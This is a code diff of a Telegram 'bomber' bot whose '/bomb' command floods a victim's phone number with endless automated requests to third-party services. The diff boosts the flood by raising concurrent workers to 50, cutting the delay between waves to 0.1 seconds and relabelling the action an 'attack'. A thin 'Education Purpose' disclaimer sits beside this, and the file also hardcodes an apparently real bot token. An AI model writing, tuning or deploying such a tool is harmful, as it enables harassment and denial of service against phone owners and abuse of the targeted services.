@@ -3,13 +3,14 @@ import threading
 import time
 import requests
 from concurrent.futures import ThreadPoolExecutor
+from requests.adapters import HTTPAdapter
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
 from flask import Flask
 
 # ================= CONFIGURATION =================
 TELEGRAM_BOT_TOKEN = "9116537219:AAGYevPHlV0uaE7LaRwzzjBY1Qlq14XgA5w"
-CHANNEL_SIGNATURE = "suraj bhai"
+CHANNEL_SIGNATURE = "sk bhai"
 # =================================================
 
 # Logging setup
@@ -24,7 +25,7 @@ flask_app = Flask('')
 
 @flask_app.route('/')
 def home():
-    return "🤖 Suraj Bhai High-Speed Bomber Bot is 24/7 Alive and Active!"
+    return "🤖 Suraj Bhai Ultra-Speed Bomber Bot is 24/7 Alive and Active!"
 
 def run_flask():
     flask_app.run(host='0.0.0.0', port=8080)
@@ -34,6 +35,12 @@ BOMBER_STATS = {
     "total_requests_sent": 0,
     "active_targets": 0
 }
+
+# Optimized HTTP Session for high-speed connection reuse
+session = requests.Session()
+adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
+session.mount('https://', adapter)
+session.mount('http://', adapter)
 
 # List of APIs provided for request execution
 APIS = [
@@ -62,9 +69,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bomber Bot Me** ✨\n"
         f"╚═══════════════════════════════════╝\n\n"
         f"⚠️ **CHETAVANI / WARNING:**\n"
-        f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
+        f"Yeh bot sirf aur sirf **Education Purpose** ke liye hai.\n\n"
         f"🚀 **Available Commands:**\n"
-        f"👉 `/bomb <phone_number>` - High-speed multi-threaded requests shuru karne ke liye.\n"
+        f"👉 `/bomb <phone_number>` - Ultra-high speed multi-threaded attack shuru karne ke liye.\n"
         f"👉 `/stats` - Live request delivery status check karne ke liye.\n\n"
         f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
     )
@@ -77,28 +84,28 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"━━━━━━━━━━━━━━━━━━━\n"
         f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
         f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
-        f"⚡ Status: High-Speed Threaded Running\n"
+        f"⚡ Status: Ultra-High-Speed Running\n"
         f"👑 Powered By: {CHANNEL_SIGNATURE}"
     )
     await update.message.reply_text(stats_msg, parse_mode="Markdown")
 
-# Single API execution worker function
+# Single API execution worker using high-speed session
 def send_single_request(api, target_phone):
     try:
         url = api["url"](target_phone, "60")
         headers = api["headers"]
         
         if api["method"] == "GET":
-            requests.get(url, headers=headers, timeout=3)
+            session.get(url, headers=headers, timeout=2)
         elif api["method"] == "POST":
             data = api["data"](target_phone, "60")
-            requests.post(url, headers=headers, data=data, timeout=3)
+            session.post(url, headers=headers, data=data, timeout=2)
         
         BOMBER_STATS["total_requests_sent"] += 1
     except Exception:
         pass
 
-# /bomb command handler with ThreadPoolExecutor for high speed
+# /bomb command handler with high concurrency
 async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text(
@@ -120,31 +127,31 @@ async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     BOMBER_STATS["active_targets"] += 1
     
-    status_msg = await update.message.reply_text(
+    await update.message.reply_text(
         f"🎯 **Target Number:** `{target_phone}`\n"
-        f"⚡ **Status:** High-speed multi-threaded requests bheji ja rahi hain...",
+        f"⚡ **Status:** Ultra-high-speed multi-threaded requests non-stop shuru ho chuki hain!",
         parse_mode="Markdown"
     )
     
-    # Run in background thread using ThreadPoolExecutor for concurrent speed
+    # Run background thread for heavy parallel execution
     threading.Thread(
-        target=run_threaded_bomber, 
+        target=run_ultra_threaded_bomber, 
         args=(target_phone, context, update.effective_chat.id)
     ).start()
 
-def run_threaded_bomber(target_phone, context, chat_id):
+def run_ultra_threaded_bomber(target_phone, context, chat_id):
     try:
-        # Infinite fast loop using ThreadPoolExecutor to fire requests parallelly
+        # Continuous ultra-fast loop with 50 concurrent workers
         while True:
-            with ThreadPoolExecutor(max_workers=10) as executor:
+            with ThreadPoolExecutor(max_workers=50) as executor:
                 for api in APIS:
                     executor.submit(send_single_request, api, target_phone)
             
-            # Short pause between waves to prevent local thread choking
-            time.sleep(1.5)
+            # Minimal delay for maximum throughput
+            time.sleep(0.1)
             
     except Exception as e:
-        print(f"❌ Error in threaded loop: {e}")
+        print(f"❌ Error in ultra threaded loop: {e}")
     finally:
         BOMBER_STATS["active_targets"] -= 1
 
@@ -159,7 +166,7 @@ def main():
     app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("bomb", handle_bomb_command))
 
-    print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
+    print(f"🤖 Suraj Bhai Ultra Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
     app.run_polling()
 
 if __name__ == '__main__':
